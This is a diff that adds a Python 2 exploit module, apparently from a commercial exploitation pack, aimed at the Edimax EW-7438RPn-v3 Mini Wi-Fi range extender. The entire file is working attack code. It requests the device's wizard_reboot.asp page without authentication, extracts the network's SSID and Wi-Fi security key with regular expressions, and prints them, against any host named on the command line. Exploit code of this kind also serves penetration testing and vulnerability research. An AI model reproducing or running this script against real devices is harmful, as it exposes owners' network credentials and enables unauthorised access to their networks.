@@ -1,0 +1,49 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2020
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_edimax_1'
+_vendor_ = 'edimax'
+_model_  = ['EW-7438RPn-v3 Mini']
+_vuln_   = 'Credentials Disclosure Vulnerability'
+_cve_    = ''
+_ref_    = 'https://packetstormsecurity.com/files/157212/edimaxew7438rpn3mini127-exec.txt'
+_port_   = 80
+
+def pwnrouter(host,port=_port_):
+  try:
+    url = "http://%s:%s/wizard_reboot.asp" % (host,port)
+    response = requests.get(url, verify=False)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+  if "showSSID" in response.text:
+    ssid = ""
+    seckey = ""
+    print '[+] %s vulnerable' % host
+    m = re.search("showSSID = \"([^\"]+)\";", response.text)
+    if m:
+        ssid = m.group(1)
+    m = re.search("if\(secModeTbl\[0\] != '0'\)\s+document.write\('<font class=\\\\\"textcolor\\\\\">'\+\"([^\"]+)\"\+'</font>", response.text, re.DOTALL)
+    if m:
+        seckey = m.group(1)
+    print('SSID: %s\nKEY: %s\n\n===\n\n'%(ssid,seckey))               
+  else:
+    print '[+] %s not vulnerable' % host
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
